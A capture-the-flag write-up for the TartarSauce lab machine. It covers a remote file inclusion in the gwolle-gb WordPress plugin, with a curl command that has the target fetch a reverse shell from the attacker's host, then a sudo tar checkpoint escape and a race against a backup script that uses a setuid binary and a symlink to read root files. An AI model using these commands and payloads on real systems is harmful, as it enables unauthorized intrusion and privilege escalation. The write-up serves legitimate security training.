# tartarSauce - writeup

## Services
```bash
└─$ nmap -sC -sV -p 80 -o nmap/tcp-script $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-10 22:24 EDT
Nmap scan report for 10.129.1.185
Host is up (0.062s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries
| /webservices/tar/tar/source/
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-title: Landing Page
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds
```
This box is running a web server on an `Apache` server with `PHP` in the backend. 
Release information about this Apache package suggests the server is running Ubuntu `Xenial`.

robots.txt revealed several interesting directories.

## HTTP

Landing page of web app is beautiful ascii art of a bottle of tartar sauce. *mwah*

We already have a `/webservices` directory to enumerate, but we'll run gobuster on the main page just in case.
*nothing interesting found*

The only path that resolved successfully was the `/webservices/monstra-3.0.4`, which just gives away the version and CMS of the application.

There is a login form at `/monstra-3.0.4/admin/` that used the default creds `admin:admin`

Several vulnerabilites are returned from searchsploit, but the admin user doesn't appear to be able to upload files or edit existing pages. The one file I am able to edit is the 404 page, but I can't get it to return.

Going back a few steps I realized that I never enumerated the `/webservices` directory. So if we enumerate that we discover a wp blog at `/wp`
```bash
/wp                   (Status: 301) [Size: 323] [--> http
```

We can attempt to quickly enumerate this blog by using wpscan and it returns version number, theme, and plugins.

`akismet` and `gwolle-gb` were returned as the plugins installed:
```bash

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.129.248.96/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2023-06-21T14:59:00.000Z
 | Readme: http://10.129.248.96/webservices/wp/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.129.248.96/webservices/wp/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.129.248.96/webservices/wp/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.129.248.96/webservices/wp/wp-content/plugins/akismet/readme.txt

[+] gwolle-gb
 | Location: http://10.129.248.96/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2023-06-13T10:33:00.000Z
 | Readme: http://10.129.248.96/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.6.0
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.129.248.96/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 |
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.129.248.96/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.129.248.96/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
```
And the wp version is `4.9.4`:
```bash
[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
```

None of these appear to be vulnerable but taking at look at each of the readme's reveals that the version # for gwolle-gb is forged.
```txt
== Changelog ==

= 2.3.10 =
* 2018-2-12
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D
```
This version of gwolle-gb has a rfi vulnerability that allows us to execute arbitrary php code on the server.

All thats needed is to have a file named `wp-load.php` on a local server and we can call that from the web app to run the code. We do this `php-reverse-shell.php` on Kali and we get a shell as www-data.

```bash
└─$ curl http://$IP/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.178:8888/
```
This vulnerability is caused by the getparameter `abspath` not being sanitized before being used in PHP `require()`. Input must be sanitized before being used in this function because it evaluates the code located in the file its fetching. The file is essentially treated as if the code was copy and pasted into the script.

## www-data -> onuma privEsc
`www-data` can run tar as the user `onuma`
```bash
    (onuma) NOPASSWD: /bin/tar
```
We know that tar can be used with `--checkpoints` to stop the archival process and execute something (usually print a message about progress). With `--checkpoints` you set a checkpoint and then use `--checkpoint-action=` to select the command you wish to execute. 

If we are able to run this as a different user we can set that action to `--checkpoint-action=exec=/bin/bash` and this will start a new shell with that users profile.

command:
```bash
$ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
$ whoami
onuma
```
## privEsc - Root

Running pspy on this machine reveals a timed service being run every 5 minutes. This service runs the `/usr/sbin/backuperer` script, which is a bash script that backs up the `/var/www/html` directory.

I'm going to break down the important segments of this script where the vulnerability lies.
Define path variables:
```bash 
# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
# /var/tmp/(sha1 hash)
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
# /var/tmp/check
check=$tmpdir/check
```

This segment cleans up the $check dir from last run, creats archive of `/var/www/html` as onuma in the background and then sleeps for 30 seconds. This sleep of 30 seconds is important as it gives us time to make changes to the archive.
```bash
# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30
```
This is the function used to check the integrity of the archive
```bash 
# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}
```
the check dir is made and the archive is extracted into it. An integrity check is done with the function. If the extracted archive is different than current `/var/www/html` the differences will be recorded in `/var/backup/onuma_backup_error.txt`. If the archive passes the integrity check, the archive is moved to the backup directory and the then deleted from the /var/tmp directory with the check directory.
```bash
/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```
We can either read files as root with this script or get Root. Both of these exploits have to do with how the script is behaving after the integrity check. Since the archive is compressed as `onuma` we can overwrite, which will cause it to fail the integrity check and write the differences in the error file, and leave the extracted contents for 5 minutes.

#### Read files from the script
1. Create a file named `test.txt` in `/var/www/html`
2. Create a `var/www/html` in `/var/tmp` directory
3. Create `test.txt` symbolic link to `/root/root.txt`
4. Use tar to archive the `/var/tmp/var/www/html` directory
5. When the temp file is placed into the /var/tmp directory replace it with the archive created in step 4.
6. Wait 30 seconds then go to error file and read diff results.

Since it was just an empty .txt file in the main `/var/www/html` directory `diff` will return the difference in the .txt file and the .txt symbolic link in our archive. This gives us read access to any file on the sytem. 


#### Getting ROOT
To get root on this system we will be creating a tar archive locally with a suid binary. Tar does not user usernames, but instead uid and guid to track ownership of archived contents.es uid and guid in archives. So when a tar archive is extracted it tries its best to reassign ownership based on uid. However, if some contents have a uid of 0 or root, they must be extracted by root to retain that ownership.

For example if I create files with uid 0 and uid 1000 on my machine
```bash

┌──(root㉿kali)-[/home/…/box/tartarSauce/scripts/test]
└─# touch test1

┌──(root㉿kali)-[/home/…/box/tartarSauce/scripts/test]
└─# touch test2

┌──(root㉿kali)-[/home/…/box/tartarSauce/scripts/test]
└─# chown kali:kali test2

┌──(root㉿kali)-[/home/…/box/tartarSauce/scripts/test]
└─# tar -cvf test.tar *
test1
test2
```
Then I move the files to another directory and extract with user kali:
```bash
┌──(kali㉿kali)-[~/htb/box/tartarSauce/scripts]
└─$ tar -xvf test.tar
test1
test2
test3

┌──(kali㉿kali)-[~/htb/box/tartarSauce/scripts]
└─$ ls -la
total 3992
drwxr-xr-x 4 kali kali    4096 Jul 12 18:06 .
drwxr-xr-x 5 kali kali    4096 Jul 12 16:32 ..
drwxr-xr-x 2 root root    4096 Jul 12 18:02 test
-rw-r--r-- 1 kali kali       0 Jul 12 18:00 test1
-rw-r--r-- 1 kali kali       0 Jul 12 18:00 test2
```
After extracting the contents they take on the uid of the user, but if Root extracts they take on their proper ownership:
```bash
┌──(root㉿kali)-[/home/…/htb/box/tartarSauce/scripts]
└─# tar -xvf test.tar
test1
test2
test3

┌──(root㉿kali)-[/home/…/htb/box/tartarSauce/scripts]
└─# ls -la
total 3992
drwxr-xr-x 4 kali kali    4096 Jul 12 18:08 .
drwxr-xr-x 5 kali kali    4096 Jul 12 16:32 ..
drwxr-xr-x 2 root root    4096 Jul 12 18:02 test
-rw-r--r-- 1 root root       0 Jul 12 18:00 test1
-rw-r--r-- 1 kali kali       0 Jul 12 18:00 test2
```
This performs the same way on another machine. Since the `uid:guid` is `0` for root on all machines.


Now that we have a good understanding of how tar maps uid's in archives we can understand how the script is vulnerable to an suid binary. If we create a suid binary locally as ROOT and then place it in a `/var/html/www` path, we can create an archive that will fail the integrity check, but be extracted by ROOT on the victim machine. After it has been extracted by root it will be remapped to the `0` uid with the suid bit still set allowing us to get a root shell.

Our binary will be a simple `setuid` that will set the uid to 0 and create a shell.

uid.c
```c
int main(void) {
        setreuid(0,0,0);
        system("/bin/bash");
}
```
I had to use the `-static` flag when compiling because the glibc library was different on the victim machine. 
Also had to use the `-m32` flag to specify 32 bit system.
```bash
└─# gcc -m32 -static -o red uid.c
uid.c: In function ‘main’:
uid.c:2:9: warning: implicit declaration of function ‘setreuid’ [-Wimplicit-function-declaration]
    2 |         setreuid(0,0,0);
      |         ^~~~~~~~
uid.c:3:9: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    3 |         system("/bin/bash");
      |         ^~~~~~
```

After compiling the file we need to create the directory structure, set the suid bit, create the archive, and send it to the victim:
```bash
└─# mkdir -p var/www/html

┌──(root㉿kali)-[/home/…/htb/box/tartarSauce/scripts]
└─# chmod 6555 red

┌──(root㉿kali)-[/home/…/htb/box/tartarSauce/scripts]
└─# cp red var/www/html

┌──(root㉿kali)-[/home/…/htb/box/tartarSauce/scripts]
└─# tar -zcvf red.tar.gz var
var/
var/www/
var/www/html/
var/www/html/red

┌──(root㉿kali)-[/home/…/htb/box/tartarSauce/scripts]
└─# nc -nvlp 8888 < red.tar.gz
listening on [any] 8888 ...
```

We can use `watch -n 1 systemctl list-timers` to monitor the timer for the script to execute.
```bash
NEXT                         LEFT         LAST                         PASSED  U
Wed 2023-07-12 18:31:41 EDT  4min 1s left Wed 2023-07-12 18:26:41 EDT  58s ago b
```
As soon as the script executes we will only have 30 seconds to swap out our archive for the backup:
```bash
onuma@TartarSauce:/var/tmp$ cp red.tar.gz .13b2584078289a831085707ee3d372716ca23c
```
Then the binary will be extracted by root and we can run it to get ROOT:
```bash
onuma@TartarSauce:/var/tmp/check/var/www/html$ ./red
root@TartarSauce:/var/tmp/check/var/www/html# whoami
root
```
